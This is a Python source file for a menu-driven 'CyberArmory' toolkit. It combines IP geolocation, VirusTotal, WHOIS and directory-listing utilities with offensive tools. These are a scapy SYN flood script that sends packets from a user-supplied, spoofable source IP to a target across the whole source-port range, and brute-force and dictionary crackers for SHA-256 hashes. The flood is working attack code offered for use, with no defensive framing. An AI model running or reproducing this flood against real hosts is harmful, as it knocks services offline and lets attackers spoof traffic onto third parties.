import os
from geoip2 import database
import requests
import csv
import hashlib
import itertools
from scapy.all import send
from scapy.layers.inet import IP, TCP
import whois
from ipwhois import IPWhois

def print_logo():
    logo = """
   _____      _                                                      
  / ____|    | |               /\                                    
 | |    _   _| |__   ___ _ __ /  \   _ __ _ __ ___   ___  _ __ _   _ 
 | |   | | | | '_ \ / _ \ '__/ /\ \ | '__| '_ ` _ \ / _ \| '__| | | |
 | |___| |_| | |_) |  __/ | / ____ \| |  | | | | | | (_) | |  | |_| |
  \_____\__, |_.__/ \___|_|/_/    \_\_|  |_| |_| |_|\___/|_|   \__, |
         __/ |                                                  __/ |
        |___/                                                  |___/ 
"""
    print(logo)

def execute_tool(tool):
    try:
        tool()
    except Exception as e:
        print(f"Error executing tool: {str(e)}")


def ip_geolocator():
    a = input("Enter the IP address whose Geolocation is to be found: ")
    database_path = "........."     ##Enter the database path 

    def get_ip_location(ip_address):
        reader = database.Reader(database_path)
        try:
            response = reader.city(ip_address)
            country = response.country.name
            city = response.city.name
            latitude = response.location.latitude
            longitude = response.location.longitude

            print(f"IP: {ip_address}\nCountry:{country}\nCity: {city}\nLatitude: {latitude}\nLongitude: {longitude}")
        except Exception as e:
            print("Error:", e)
        finally:
            reader.close()

    if __name__ == "__main__":
        ip_to_lookup = a
        get_ip_location(ip_to_lookup)

def virus_total_scan():
    API_KEY = '...............'  # Set up an api_key to get results.

    def scan_ip(ip_address):
        ip_scan_endpoint = 'https://www.virustotal.com/vtapi/v2/ip-address/report'
        params = {
            'apikey': API_KEY,
            'ip': ip_address
        }

        response = requests.get(ip_scan_endpoint, params=params)
        return response.json()

    def extract_detection_info(scan_result):
        detection_count = scan_result.get('detected_communicating_samples', 0)
        scan_date = scan_result.get('scan_date', '')
        return detection_count, scan_date

    if __name__ == '__main__':
        n = int(input('Enter the number of IP addresses to be scanned: '))
        ips_to_scan = []

        for i in range(n):
            ip = input(f"Enter IP address {i + 1}: ")
            ips_to_scan.append(ip)

        results = []

        for ip in ips_to_scan:
            ips_result = scan_ip(ip)
            detection_count, scan_date = extract_detection_info(ips_result)
            results.append({'IP': ip, 'Detection Count': detection_count, 'Scan Date': scan_date})
        
        current_directory = os.getcwd()

        # Keeping results in a CSV file. CSV file may be more useful. Example-when using pandas library for data analysis
        csv_path = os.path.join(current_directory, 'ip_scan_results.csv')
        with open(csv_path, 'w', newline='', encoding='utf-8') as csv_file:
            fieldnames = ['IP', 'Detection Count', 'Scan Date']
            csv_writer = csv.DictWriter(csv_file, fieldnames=fieldnames)
            csv_writer.writeheader()
            csv_writer.writerows(results)

        print(f"IP scan results in '{csv_path}")

def brute_force_pass_cracker():
    def hash_password(password):
        return hashlib.sha256(password.encode()).hexdigest()

    def brute_force(target_hash, max_length, charset):
        for length in range(1, max_length + 1):
            for combination in itertools.product(charset, repeat=length):
                password = ''.join(combination)
                hashed_password = hash_password(password)
                if hashed_password == target_hash:
                    return password
        return None

    if __name__ == "__main__":
        target_hash = input("Enter the target hash to crack: ")
        max_length = int(input("Enter the maximum length of the password: "))
        custom_charset = input("Enter a custom character set or press Enter to use the default character set: ")

        if not custom_charset:
            charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-=_+[]{}|;:'\",.<>/?"
        else:
            charset = custom_charset

        print(f"Using Brute Force Attack with a maximum password length of {max_length} and character set: {charset}")

        cracked_password = brute_force(target_hash, max_length, charset)

        if cracked_password:
            print(f"Password Cracked! The password is: {cracked_password}")
        else:
            print("Password not found.")


def recursive_directory_lister():
    def list_files_with_extension(directory, extension, output_file):
        for root, dirs, files in os.walk(directory):
            for file in files:
                if extension is None or file.endswith(extension):
                    file_path = os.path.join(root, file)
                    output_file.write(file_path + '\n')

    if __name__ == "__main__":
        user_input_directory = input("Enter path for directory listing: ")
        user_input_extension = input("Enter file extension to search for (or press Enter to search for all files): ")

        if os.path.exists(user_input_directory):
            output_file_path = f"files_with_{user_input_extension}_extension.txt" if user_input_extension else "directory_list.txt"
            with open(output_file_path, 'w') as output_file:
                output_file.write(
                    f"Files{' with ' + user_input_extension + ' extension' if user_input_extension else ''} in {user_input_directory} and its subdirectories:\n")
                list_files_with_extension(user_input_directory, user_input_extension, output_file)

            print(f"File paths saved to: {os.path.abspath(output_file_path)}")  # Print the absolute path
        else:
            print("Invalid directory path. Please provide a valid directory.")

def syn_flood():
    def synflood(src, trgt):
        for sport in range(1024, 65535):
            ip_layer = IP(src=src, dst=trgt)
            tcp_layer = TCP(sport=sport, dport=513)
            pkt = ip_layer / tcp_layer
            send(pkt)

    if __name__ == '__main__':
        src = input("Enter the source IP address: ")
        trgt = input("Enter the target IP address: ")
        synflood(src, trgt)


def whois_lookup():
    def perform_whois_lookup(domain_name):
        try:
            whois_info = whois.whois(domain_name)
            print(whois_info)

        except Exception as e:
            print("Error:", e)

    if __name__ == "__main__":
        domain_name = input("Enter the domain name or IP to lookup: ")  # Replace with the Domain Name or IP of the domain to lookup
        perform_whois_lookup(domain_name)

def ip_whois():
    def perform_ip_whois(ip_address):
        try:
            ip = IPWhois(ip_address)
            ip_info = ip.lookup_rdap()
            print(ip_info)
        except Exception as e:
            print("Error:", e)

    if __name__ == "__main__":
        ip_address = input("Enter IP address to lookup:")  # IP address to lookup
        perform_ip_whois(ip_address)

def dictionary_pass_cracker():
    def read_dictionary(file_path):
        try:
            with open(file_path, 'r') as file:
                return [line.strip() for line in file]
        except FileNotFoundError:
            print(f"Error: Dictionary file '{file_path}' not found.")
            return []

    def hash_password(password):
        return hashlib.sha256(password.encode()).hexdigest()

    def crack_password(target_hash, dictionary):
        for word in dictionary:
            hashed_word = hash_password(word)
            if hashed_word == target_hash:
                return word
        return None

    if __name__ == "__main__":
        target_hash = input("Enter the target hash to crack: ")  # Hash to crack
        dictionary_file = input("Enter the path to the dictionary file: ")  # Path to the dictionary file

        dictionary = read_dictionary(dictionary_file)

        if dictionary:
            print("Dictionary loaded successfully.")
            print("Attempting to crack the password...")

            cracked_password = crack_password(target_hash, dictionary)

            if cracked_password:
                print(f"Password Cracked! The password is: {cracked_password}")
            else:
                print("Password not found in the dictionary.")
        else:
            print("Unable to proceed without a valid dictionary.")

def main():
    print_logo()

    tool_functions = [
        (None, ""),
        (ip_geolocator, "IP Geolocator"),
        (virus_total_scan, "VirusTotal Scan"),
        (recursive_directory_lister, "Recursive Directory Lister"),
        (syn_flood, "SYN Flood"),
        (whois_lookup, "WHOIS Lookup"),
        (ip_whois, "IP WHOIS"),
        (dictionary_pass_cracker, "Dictionary Pass Cracker"),
        (brute_force_pass_cracker, "Brute Force Pass Cracker")        
    ]

    print("Choose a tool to execute:")
    for i, (_, display_name) in enumerate(tool_functions[1:], start=1):
        print(f"{i}. {display_name}")

    # Get user input
    try:
        tool_index = int(input("Enter the serial number of the tool to be executed: "))
        if 1 <= tool_index <= len(tool_functions):
            execute_tool(tool_functions[tool_index][0])
        else:
            print("Invalid choice. Please enter a valid number.")
    except ValueError:
        print("Invalid input. Please enter a number.")

if __name__ == "__main__":
    main()
